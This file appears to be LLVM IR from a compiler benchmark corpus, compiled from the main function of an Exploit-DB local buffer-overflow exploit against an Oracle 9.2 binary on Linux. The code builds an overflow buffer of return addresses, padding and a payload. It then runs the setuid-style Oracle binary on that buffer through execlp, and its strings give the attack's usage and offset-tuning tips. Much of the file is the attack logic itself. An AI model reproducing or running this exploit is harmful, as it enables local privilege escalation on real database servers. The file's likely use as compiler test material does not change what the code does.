; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_23258.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_23258.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@SMASHIT = common dso_local global i32 0, align 4
@DEFAULT = common dso_local global i16 0, align 2
@.str = private unnamed_addr constant [127 x i8] c"\0A\0A*************************************************************\0A*************************************************************\0A\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"[-] %s\0A\00", align 1
@VERSION = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [523 x i8] c"[-] -------------------------------------------------------\0A[-] An offset value from 1750 - 3500 should work perfectly\0A[-] if this does not nail it first time.\0A[-] -------------------------------------------------------\0A[-] Execute this PoC and attach ltrace with -o to a file so\0A[-] you can grep for the goodness - c0ntex@hushmail.com\0A[-] http://twistedminds.mine.nu/files/oracle_ownage.c\0A[-] -------------------------------------------------------\0A[-] gcc -Wall -o oracle_owned oracle_owned.c\0A[-] Usage: %s offset_value\0A\00", align 1
@operation_oracle = common dso_local global i32 0, align 4
@PADDING = common dso_local global i8 0, align 1
@.str.3 = private unnamed_addr constant [32 x i8] c"[-] Using Return address 0x%lx\0A\00", align 1
@.str.4 = private unnamed_addr constant [27 x i8] c"[-] Using offset value %d\0A\00", align 1
@.str.5 = private unnamed_addr constant [126 x i8] c"*************************************************************\0A*************************************************************\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [54 x i8] c"/database/u00/app/oracle/product/9.2.0.1.0/bin/oracle\00", align 1
@VULNUBL = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i16, align 2
  %10 = alloca i16, align 2
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* @SMASHIT, align 4
  %12 = zext i32 %11 to i64
  %13 = call i8* @llvm.stacksave()
  store i8* %13, i8** %6, align 8
  %14 = alloca i8, i64 %12, align 16
  store i64 %12, i64* %7, align 8
  store i16 0, i16* %9, align 2
  %15 = load i32, i32* %4, align 4
  %16 = icmp sgt i32 %15, 1
  br i1 %16, label %17, label %22

17:                                               ; preds = %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 1
  %20 = load i8*, i8** %19, align 8
  %21 = call zeroext i16 @atol(i8* %20)
  store i16 %21, i16* %9, align 2
  br label %24

22:                                               ; preds = %2
  %23 = load i16, i16* @DEFAULT, align 2
  store i16 %23, i16* %9, align 2
  br label %24

24:                                               ; preds = %22, %17
  %25 = call zeroext i16 (...) @retrieve_offset()
  %26 = zext i16 %25 to i32
  %27 = load i16, i16* %9, align 2
  %28 = zext i16 %27 to i32
  %29 = sub nsw i32 %26, %28
  %30 = sext i32 %29 to i64
  store i64 %30, i64* %8, align 8
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([127 x i8], [127 x i8]* @.str, i64 0, i64 0))
  %32 = load i8*, i8** @VERSION, align 8
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i8* %32)
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([523 x i8], [523 x i8]* @.str.2, i64 0, i64 0), i8* %36)
  store i16 0, i16* %10, align 2
  br label %38

38:                                               ; preds = %49, %24
  %39 = load i16, i16* %10, align 2
  %40 = zext i16 %39 to i32
  %41 = load i32, i32* @SMASHIT, align 4
  %42 = icmp slt i32 %40, %41
  br i1 %42, label %43, label %54

43:                                               ; preds = %38
  %44 = load i64, i64* %8, align 8
  %45 = load i16, i16* %10, align 2
  %46 = zext i16 %45 to i64
  %47 = getelementptr inbounds i8, i8* %14, i64 %46
  %48 = bitcast i8* %47 to i64*
  store i64 %44, i64* %48, align 1
  br label %49

49:                                               ; preds = %43
  %50 = load i16, i16* %10, align 2
  %51 = zext i16 %50 to i32
  %52 = add nsw i32 %51, 4
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %10, align 2
  br label %38

54:                                               ; preds = %38
  store i16 0, i16* %10, align 2
  br label %55

55:                                               ; preds = %70, %54
  %56 = load i16, i16* %10, align 2
  %57 = zext i16 %56 to i32
  %58 = load i32, i32* @SMASHIT, align 4
  %59 = load i32, i32* @operation_oracle, align 4
  %60 = call i32 @strlen(i32 %59)
  %61 = sub nsw i32 %58, %60
  %62 = sub nsw i32 %61, 80
  %63 = icmp slt i32 %57, %62
  br i1 %63, label %64, label %73

64:                                               ; preds = %55
  %65 = load i8, i8* @PADDING, align 1
  %66 = load i16, i16* %10, align 2
  %67 = zext i16 %66 to i32
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8, i8* %14, i64 %68
  store i8 %65, i8* %69, align 1
  br label %70

70:                                               ; preds = %64
  %71 = load i16, i16* %10, align 2
  %72 = add i16 %71, 1
  store i16 %72, i16* %10, align 2
  br label %55

73:                                               ; preds = %55
  %74 = load i16, i16* %10, align 2
  %75 = zext i16 %74 to i32
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8, i8* %14, i64 %76
  %78 = load i32, i32* @operation_oracle, align 4
  %79 = load i32, i32* @operation_oracle, align 4
  %80 = call i32 @strlen(i32 %79)
  %81 = call i32 @memcpy(i8* %77, i32 %78, i32 %80)
  %82 = load i64, i64* %8, align 8
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.3, i64 0, i64 0), i64 %82)
  %84 = load i16, i16* %9, align 2
  %85 = zext i16 %84 to i32
  %86 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.4, i64 0, i64 0), i32 %85)
  %87 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.5, i64 0, i64 0))
  %88 = load i32, i32* @VULNUBL, align 4
  %89 = call i32 @execlp(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.6, i64 0, i64 0), i32 %88, i8* %14, i32* null)
  store i32 0, i32* %3, align 4
  %90 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %90)
  %91 = load i32, i32* %3, align 4
  ret i32 %91
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local zeroext i16 @atol(i8*) #2

declare dso_local zeroext i16 @retrieve_offset(...) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @execlp(i8*, i32, i8*, i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
